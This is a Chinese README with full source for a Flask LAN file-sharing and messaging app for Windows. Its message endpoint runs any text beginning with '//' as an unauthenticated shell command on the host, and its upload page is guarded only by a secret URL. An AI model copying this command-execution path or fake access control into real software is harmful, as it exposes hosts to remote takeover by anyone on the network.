# 本篇文章是对超级无敌服务的用法说明

## 项目解释

本项目是运行在`Windows`上的一款可以让局域网用户

- 上传文件（入口由密码保护**注意，这个是假保护，上传文件的链接是固定的，如果用户知道了链接，那么下一次不需要输入密码就可以进入，所以请注意**）

- 下载文件

- 向服务端发送消息

- 管理文件（入口由密码保护,**这个是真保护**）

的应用

> [!CAUTION]
>
> 写代码的环境为`python3.11`的`Windows11`中，如无法运行，请试一下这个

## 准备工作

需要在`cmd`或`powershell`中输入：

```sh
pip install flask werkzeug plyer pillow rich termcolor pyperclip
```

## 代码放置方式

以下是该项目的文件放置方式

```tree
消息（此名可改）
│  app.py
│
├─mima
│      mima.txt
│
├─shangchuan
│
└─templates
        download.html
        filemanagement.html
        index.html
        indexapp.html
        xz.html
```

## 详细代码

> [!IMPORTANT]
>
> 请自行修改`mima.txt`，如果复制我的`mima.txt`，那么密码就是`114514`
>
> 密码仅为一行

### 主程序

> 主程序由python编写

```python
from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory, render_template_string
from werkzeug.utils import secure_filename
from plyer import notification
from datetime import datetime
import os
import subprocess
import time
import re
from PIL import ImageGrab
from rich.progress import Progress
from tkinter import Tk, simpledialog
from termcolor import colored
import socket
import pyperclip

app = Flask(__name__)
app.secret_key = 'your_secret_key'

# 上传文件存储的目录
UPLOAD_FOLDER = 'shangchuan'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# 密码文件的路径
PASSWORD_FILE = 'mima/mima.txt'

# 用于记录上传的文件信息
upload_records = []

# 清理非法字符以用于文件名
def sanitize_filename(filename):
    return re.sub(r'[\\/:*?"<>|]', '', filename)

# 执行命令后延迟截屏并保存
def execute_and_capture(command):
    subprocess.Popen(f'start cmd /k {command}', shell=True)
    time.sleep(sj)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    sanitized_command = sanitize_filename(command)
    screenshot_filename = f"{sanitized_command}_{timestamp}.png"
    screenshot_dir = 'shangchuan'
    os.makedirs(screenshot_dir, exist_ok=True)
    screenshot_path = os.path.join(screenshot_dir, screenshot_filename)
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)

# 获取当天日期，格式为 yyyy-mm-dd
def get_today_date():
    return datetime.now().strftime('%Y-%m-%d')

# 写入剪切板
def get_internal_ip():
    hostname = socket.gethostname()
    internal_ip = socket.gethostbyname(hostname)
    return internal_ip

def timeout_input(prompt, timeout):
    result = None
    def close_window():
        try:
            root.quit()
            root.destroy()
        except Exception:
            pass
    root = Tk()
    root.withdraw()
    root.after(timeout * 1000, close_window)
    root.update()
    result = simpledialog.askstring("输入", prompt)
    try:
        root.quit()
        root.destroy()
    except Exception:
        pass
    return result

print("--------服务端正在启动--------")
time.sleep(0.1)
print("--------服务端正在初始化--------")
#time.sleep(1)

with Progress() as progress:
    task = progress.add_task("[green]加载中...", total=100)
    while not progress.finished:
        progress.update(task, advance=1)
        time.sleep(0.03)

#time.sleep(1)

print("--------正在启动选择页面--------")
with Progress() as progress:
    task = progress.add_task("[green]启动中...", total=100)
    while not progress.finished:
        progress.update(task, advance=1)
        time.sleep(0.005)
print("--------已启动选择页面！--------")
time.sleep(0.5)
print("--------等待输入...（10秒不输入自动跳过）--------")

# 弹窗输入截屏延时，默认值为 10 秒
sj_input = timeout_input("请输入截屏延时（秒）：", 10)
try:
    sj = int(sj_input) if sj_input else 10
except ValueError:
    print("输入无效，默认延时设置为 10 秒。")
    sj = 10

print("--------服务端正在配置--------")
with Progress() as progress:
    task = progress.add_task("[green]配置中...", total=100)
    while not progress.finished:
        progress.update(task, advance=1)
        time.sleep(0.01)

if __name__ == "__main__":
    ip = get_internal_ip()
    full_address = f"{ip}:5000"
    pyperclip.copy(full_address)
    clipboard_content = pyperclip.paste()
    print("--------服务端配置成功！--------（时间=", sj, "秒)")
    print(colored(f"已将网址写入剪切板: {clipboard_content}", "red"))

# 添加日志记录函数
def log_action(action, details):
    date_str = get_today_date()
    log_dir = 'shangchuan'
    os.makedirs(log_dir, exist_ok=True)
    file_path = os.path.join(log_dir, f'{date_str}.txt')
    try:
        with open(file_path, 'a', encoding='utf-8') as file:
            log_entry = f'{datetime.now().strftime("%Y-%m-%d %H:%M:%S")} | {action} | {details}\n'
            file.write(log_entry)
    except Exception as e:
        print(f"日志写入失败: {str(e)}")

# Flask Routes
@app.route('/')
def xz():
    return render_template('xz.html')

#消息
@app.route('/xx')
def index():
    return send_from_directory('templates', 'index.html')

@app.route('/xz')
def download_file():
    files = os.listdir(app.config['UPLOAD_FOLDER'])
    return render_template('download.html', files=files)

@app.route('/1145149237840190872134341278902134790892378041sdfaoiuhsafduhioasouihdshfuodiasfuhoid', methods=['GET', 'POST'])
def file_management():
    if request.method == 'POST':
        entered_password = request.form.get('password')
        try:
            with open(PASSWORD_FILE, 'r') as f:
                stored_password = f.read().strip()
            if entered_password == stored_password:
                files = os.listdir(app.config['UPLOAD_FOLDER'])
                return render_template('filemanagement.html', files=files)
            else:
                flash('密码错误！')
                return redirect(url_for('xz'))
        except Exception as e:
            print(f"读取密码文件时出错: {e}")
            flash('读取密码文件时出错！')
            return redirect(url_for('xz'))
    elif request.method == 'GET':
        flash('请通过正确途径进入文件管理页面！')
        return redirect(url_for('xz'))

@app.route('/scsdufighohuofigdshgufdsiosdfghuiogsdfuhoihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihii3957248024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024239048572093485702934587', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            return redirect(request.url)
        ip_address = request.remote_addr
        upload_date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        filename = os.path.basename(file.filename)
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)
        upload_records.append({'ip': ip_address, 'filename': filename, 'date': upload_date})
        
        # 记录上传信息到日志
        log_action('上传文件', f'{ip_address} 上传了 {filename} ')
        
        # 上传完成后重定向到文件管理页面
        return redirect(url_for('file_management'))
    
    return render_template('indexapp.html', upload_records=upload_records)

@app.route('/delete/<filename>')
def delete_file(filename):
    sanitized_filename = sanitize_filename(filename)
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], sanitized_filename)
    if os.path.exists(file_path):
        os.remove(file_path)
        flash(f'文件 {sanitized_filename} 已删除')
        log_action('删除文件', f'{sanitized_filename} 被删除')
    else:
        flash(f'文件 {sanitized_filename} 不存在')
        log_action('删除失败', f'尝试删除 {sanitized_filename} 但文件不存在')
    files = os.listdir(app.config['UPLOAD_FOLDER'])
    return render_template('filemanagement.html', files=files)

@app.route('/download/<filename>')
def download(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/send-message', methods=['POST'])
def send_message():
    data = request.get_json()
    message = data.get('message')
    if not message:
        return "No message provided", 400
    sender_ip = request.remote_addr
    date_str = get_today_date()
    log_dir = 'shangchuan'
    os.makedirs(log_dir, exist_ok=True)
    file_path = os.path.join(log_dir, f'{date_str}.txt')
    log_action('消息', f'来自{sender_ip}，内容：{message}')
    #try:
        #with open(file_path, 'a', encoding='utf-8') as file:
            #log_entry = f'{sender_ip} | {datetime.now().strftime("%Y-%m-%d %H:%M:%S")} | {message}\n'
            #file.write(log_entry)
    #except Exception as e:
        #return f"日志写入失败: {str(e)}", 500
    if message.startswith("//"):
        command = message[2:].strip()
        try:
            execute_and_capture(command)
        except Exception as e:
            return f"命令执行失败: {str(e)}", 500
    notification.notify(
        title=f"来自 {sender_ip} 的新消息",
        message=message,
        timeout=5
    )
    return "Message sent successfully"

@app.route('/logs', methods=['GET'])
def view_logs():
    date_str = get_today_date()
    file_path = os.path.join('shangchuan', f'{date_str}.txt')
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            log_content = file.read()
    except FileNotFoundError:
        log_content = "今日无日志记录。"
    html_template = """
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>日志内容</title>
    </head>
    <body>
        <h1>日志内容 - {{ date_str }}</h1>
        <pre>{{ log_content }}</pre>
        <a href="/">返回首页</a>
    </body>
    </html>
    """
    return render_template_string(html_template, date_str=date_str, log_content=log_content)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

print("--------服务端正在安全退出--------")
time.sleep(1)
print("--------服务端即将退出，请等待--------")
with Progress() as progress:
    task = progress.add_task("[red]退出中...", total=100)
    while not progress.finished:
        progress.update(task, advance=1)
        time.sleep(0.03)
print("--------服务端已经退出--------")
time.sleep(1)
```

### html部分

#### download.html

> 这是下载界面，用户可以选择文件并下载

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>文件下载</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .container {
            margin: 20px;
        }
        .file-link {
            font-size: 18px;
            color: #007BFF;
            text-decoration: none;
        }
        .file-link:hover {
            text-decoration: underline;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            font-size: 18px;
            color: #007BFF;
            text-decoration: none;
        }
        .back-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>下载文件</h1>
    <ul>
        {% for file in files %}
            <li>
                <a href="{{ url_for('download', filename=file) }}">{{ file }}</a>
                <!-- 预览区域 -->
                {% if file.endswith('.jpg') or file.endswith('.png') or file.endswith('.gif') %}
                    <div>
                        <img src="{{ url_for('download', filename=file) }}" alt="{{ file }}" style="max-width: 300px; max-height: 300px;">
                    </div>
                {% elif file.endswith('.mp4') or file.endswith('.webm') or file.endswith('.ogg') %}
                    <div>
                        <video controls style="max-width: 300px; max-height: 300px;">
                            <source src="{{ url_for('download', filename=file) }}" type="video/mp4">
                        </video>
                    </div>
                {% elif file.endswith('.mp3') or file.endswith('.wav') %}
                    <div>
                        <audio controls>
                            <source src="{{ url_for('download', filename=file) }}" type="audio/mpeg">
                        </audio>
                    </div>
               
                {% endif %}
            </li>
        {% endfor %}
    </ul>
        <a href="/" class="back-link">返回选择页面</a>
    </div>
</body>
</html>
```

#### filemanagement.html

> 这是文件管理界面，此界面普通用户需要在xz.html输入密码才能进入

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>文件管理</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .container {
            margin: 20px;
        }
        .file-link {
            font-size: 18px;
            color: #007BFF;
            text-decoration: none;
        }
        .file-link:hover {
            text-decoration: underline;
        }
        .delete-link {
            font-size: 18px;
            color: red;
            margin-left: 10px;
            text-decoration: none;
        }
        .delete-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>文件管理</h1>
	<h2><a href="/scsdufighohuofigdshgufdsiosdfghuiogsdfuhoihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihii3957248024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024239048572093485702934587"><button>上传</button></a></h2>
        <ul>
            {% for file in files %}
            <li>
                {{ file }}
                <a href="/delete/{{ file }}" class="delete-link">删除</a>
            </li>
            {% endfor %}
        </ul>
        <a href="/" class="back-link">返回选择页面</a>
	
    </div>
</body>
</html>
```

#### index.html

> 这个是发送消息界面，可以向这个服务的发起者发送消息

> [!NOTE]
>
> 虽然叫index.html，但它并不是主页

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>发送消息V4.6.19</title>
<script>
        function sendDesktopCommand() {
            // 定义要发送的消息
            const message = "//start E:/桌面";

            // 通过 fetch 向服务器发送 POST 请求
            fetch('/send-message', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ message: message })
            }).then(response => response.text())
              .then(data => {
                  alert("已发送打开桌面命令！");
              }).catch(error => {
                  console.error('错误:', error);
              });
        }
	function sendjituCommand() {
            // 定义要发送的消息
            const message = "//exit";

            // 通过 fetch 向服务器发送 POST 请求
            fetch('/send-message', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ message: message })
            }).then(response => response.text())
              .then(data => {
                  alert("已发送截图命令，请在下载中查看！");
              }).catch(error => {
                  console.error('错误:', error);
              });
        }

    </script>
</head>
<body>
    <h1>发送消息到服务器</h1>
<div>
	快捷按钮：
	<a href="/"><button>返回选择</button></a>
	<button onclick="sendjituCommand()">向服务器请求截图</button>
	</div>
    <form id="messageForm">
        <label for="message">请输入消息内容：</label>
        <input type="text" id="message" name="message" required>
        <button type="submit">发送</button>
   
    </form>
    <script>
        document.getElementById('messageForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const message = document.getElementById('message').value;
            fetch('/send-message', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ message: message })
            }).then(response => response.text())
              .then(data => alert(data))
              .catch(error => console.error('错误:', error));
        });
    </script>
</body>
</html>
```

#### indexapp.html

> 这是文件上传页面，用户可以上传文件，将存到发起者的“shangchuan”文件夹

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>文件上传V1.1.2</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .container {
            margin: 20px;
        }
        .btn {
            padding: 10px 20px;
            margin: 10px 0;
            font-size: 18px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
            text-decoration: none;
            cursor: pointer;
        }
        .btn:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>文件上传</h1>
        <form action="/scsdufighohuofigdshgufdsiosdfghuiogsdfuhoihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihihii3957248024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024024239048572093485702934587" method="POST" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" value="上传" class="btn">
        </form>
        
        <a href="/" class="btn">返回选择页面</a>

        <h2>单次启动上传记录</h2>
        <ul>
            {% for record in upload_records %}
            <li>{{ record.ip }} 上传了 {{ record.filename }} 于 {{ record.date }}</li>
            {% endfor %}
        </ul>
    </div>
</body>
</html>
```

#### xz.html

> 这是主页，可以选择操作

> [!NOTE]
>
> 这个代码夹带私货，如果找并删除了，这个代码就给你了

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>简易选择页面V5.8.40</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 90vh;
            margin: 0;
        }
        .buttons {
            display: flex;
            gap: 20px;
        }
        .password-box {
            position: fixed;
            bottom: 20px;
            right: 20px;
            visibility: hidden;
        }
        .hover-text {
            position: fixed;
            top: 20px;
            left: 20px;
            padding: 10px;
            background-color: white;
            color: white;
            transition: all 0.3s ease;
        }
        .hover-text:hover {
            background-color: white;
            color: black;
        }
        .hover-area {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 200px;
            height: 50px;
            background-color: transparent;
        }
        .hover-area:hover ~ .password-box,
        .password-box:hover {
            visibility: visible;
        }
    </style>
    <script>
        function decodeText() {
            const encodedText = "546L5a2d5pCP54mb6YC877yB77yB77yB";  
            const decodedText = decodeURIComponent(escape(atob(encodedText))); 
            document.getElementById("hover-text").textContent = decodedText;
        }
        window.onload = decodeText;
    </script>
</head>
<body>
    <h1>请选择操作</h1>
    <div class="buttons">
        <a href="/xz"><button>下载</button></a>
        <a href="/xx"><button>消息</button></a>
        <a href="/logs"><button>日志</button></a>
    </div>

    <div class="hover-text" id="hover-text">
    </div>

    <div class="hover-area"></div>
    <div class="password-box">
        <form action="/1145149237840190872134341278902134790892378041sdfaoiuhsafduhioasouihdshfuodiasfuhoid" method="POST">
            <input type="password" name="password" placeholder="输入密码">
            <button type="submit">管理文件</button>
        </form>
    </div>
</body>
</html>

```
